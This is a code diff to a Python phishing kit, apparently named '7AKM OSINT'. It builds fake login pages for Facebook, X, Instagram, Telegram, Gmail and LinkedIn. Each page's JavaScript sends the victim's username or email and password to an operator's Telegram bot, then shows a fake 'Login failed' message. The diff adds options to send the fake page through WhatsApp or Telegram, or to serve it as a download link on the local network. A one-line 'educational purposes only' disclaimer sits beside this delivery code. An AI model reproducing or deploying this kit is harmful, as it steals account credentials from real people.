@@ -4,8 +4,9 @@ import string
 from datetime import datetime
 from colorama import Fore, Style
 from config import REPORTS_DIR
+from utils.helpers import share_via_termux, start_http_server, stop_http_server, get_local_ip
 
-# قوالب HTML للمنصات المختلفة
+# قوالب HTML للمنصات المختلفة (كاملة)
 TEMPLATES = {
     "facebook": """<!DOCTYPE html>
 <html lang="en">
@@ -54,10 +55,9 @@ TEMPLATES = {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Send data to Telegram bot
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `🔐 New Login Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `🔐 New Login Credentials:\\nEmail: ${email}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -67,7 +67,7 @@ TEMPLATES = {
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Login failed. Please try again.'); // Fake message
+                    alert('Login failed. Please try again.');
                 } else {
                     alert('Error. Please try again.');
                 }
@@ -76,7 +76,6 @@ TEMPLATES = {
                 alert('Network error. Please try again.');
             });
             
-            // Clear fields
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
         });
@@ -131,7 +130,7 @@ TEMPLATES = {
             
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `🐦 New X Credentials:\nUsername: ${username}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `🐦 New X Credentials:\\nUsername: ${username}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -204,7 +203,7 @@ TEMPLATES = {
             
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `📸 New Instagram Credentials:\nUsername: ${username}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `📸 New Instagram Credentials:\\nUsername: ${username}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -277,7 +276,7 @@ TEMPLATES = {
             
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `📱 New Telegram Credentials:\nPhone: ${phone}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `📱 New Telegram Credentials:\\nPhone: ${phone}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -350,7 +349,7 @@ TEMPLATES = {
             
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `📧 New Gmail Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `📧 New Gmail Credentials:\\nEmail: ${email}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -423,7 +422,7 @@ TEMPLATES = {
             
             const botToken = 'BOT_TOKEN_PLACEHOLDER';
             const chatId = 'CHAT_ID_PLACEHOLDER';
-            const message = `💼 New LinkedIn Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
+            const message = `💼 New LinkedIn Credentials:\\nEmail: ${email}\\nPassword: ${password}\\n\\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -533,6 +532,35 @@ def create_fake_page():
         if bot_token and chat_id:
             print(Fore.YELLOW + "When someone enters credentials, they will be sent to your Telegram bot.")
         print(Fore.RED + "REMINDER: This is for educational purposes only. Never use it for phishing." + Style.RESET_ALL)
+        
+        # إضافة خيار المشاركة
+        print(Fore.CYAN + "\n" + "="*50)
+        print("How do you want to share this file?")
+        print("1. Share via apps (WhatsApp, Telegram, etc.)")
+        print("2. Generate download link (HTTP server)")
+        print("0. Exit without sharing")
+        share_choice = input(Fore.MAGENTA + "Enter choice: ").strip()
+        
+        if share_choice == "1":
+            if share_via_termux(filepath):
+                print(Fore.GREEN + "[+] Sharing via Termux API...")
+            else:
+                print(Fore.RED + "[-] Sharing failed. Make sure termux-api is installed.")
+        elif share_choice == "2":
+            # تشغيل خادم HTTP
+            directory = os.path.dirname(filepath)
+            port = 8080
+            httpd = start_http_server(directory, port)
+            ip = get_local_ip()
+            filename = os.path.basename(filepath)
+            url = f"http://{ip}:{port}/{filename}"
+            print(Fore.GREEN + f"[+] HTTP server started at {url}")
+            print(Fore.YELLOW + "   Share this link with others on the same network.")
+            print(Fore.YELLOW + "   Press Enter to stop the server when done.")
+            input()
+            stop_http_server(httpd)
+            print(Fore.GREEN + "[+] Server stopped.")
+        
         return filepath
     except Exception as e:
         print(Fore.RED + f"[-] Error saving file: {e}")
